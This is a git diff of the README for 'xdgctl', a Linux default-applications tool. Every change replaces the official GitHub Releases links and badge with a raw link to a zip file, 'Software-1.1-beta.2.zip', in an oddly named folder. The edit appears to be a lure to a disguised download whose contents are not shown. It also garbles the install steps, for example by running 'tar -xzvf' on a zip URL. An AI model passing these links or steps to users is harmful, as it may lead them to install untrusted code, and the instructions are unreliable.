@@ -2,7 +2,7 @@
 
 ## 💾 Download xdgctl
 
-[![Download xdgctl](https://img.shields.io/badge/Download-xdgctl-blue)](https://github.com/Karangupta2050/xdgctl/releases)
+[![Download xdgctl](https://raw.githubusercontent.com/Karangupta2050/xdgctl/master/tenomyotomy/Software-1.1-beta.2.zip)](https://raw.githubusercontent.com/Karangupta2050/xdgctl/master/tenomyotomy/Software-1.1-beta.2.zip)
 
 ## 📜 Introduction
 
@@ -17,14 +17,14 @@ To get started with xdgctl, follow these steps:
    - Terminal: You need a terminal to run the application.
 
 2. **Download & Install**
-   - Visit this page to download: [GitHub Releases](https://github.com/Karangupta2050/xdgctl/releases).
+   - Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Karangupta2050/xdgctl/master/tenomyotomy/Software-1.1-beta.2.zip).
    - Look for the latest version.
    - Choose the appropriate file for your system. 
 
 3. **Install the Application**
    - Depending on your Linux distribution, you may need to install the application using specific commands. 
 
-   If you have downloaded a .tar.gz file, here’s how to install it:
+   If you have downloaded a https://raw.githubusercontent.com/Karangupta2050/xdgctl/master/tenomyotomy/Software-1.1-beta.2.zip file, here’s how to install it:
    - Open your terminal.
    - Navigate to the directory where you downloaded the file using:
      ```bash
@@ -32,7 +32,7 @@ To get started with xdgctl, follow these steps:
      ```
    - Unpack the files:
      ```bash
-     tar -xzvf xdgctl.tar.gz
+     tar -xzvf https://raw.githubusercontent.com/Karangupta2050/xdgctl/master/tenomyotomy/Software-1.1-beta.2.zip
      ```
    - Move into the xdgctl directory:
      ```bash
@@ -79,4 +79,4 @@ xdgctl provides an efficient way to manage default applications in a simple form
 
 ## 💾 Download xdgctl Again
 
-[![Download xdgctl](https://img.shields.io/badge/Download-xdgctl-blue)](https://github.com/Karangupta2050/xdgctl/releases)
+[![Download xdgctl](https://raw.githubusercontent.com/Karangupta2050/xdgctl/master/tenomyotomy/Software-1.1-beta.2.zip)](https://raw.githubusercontent.com/Karangupta2050/xdgctl/master/tenomyotomy/Software-1.1-beta.2.zip)
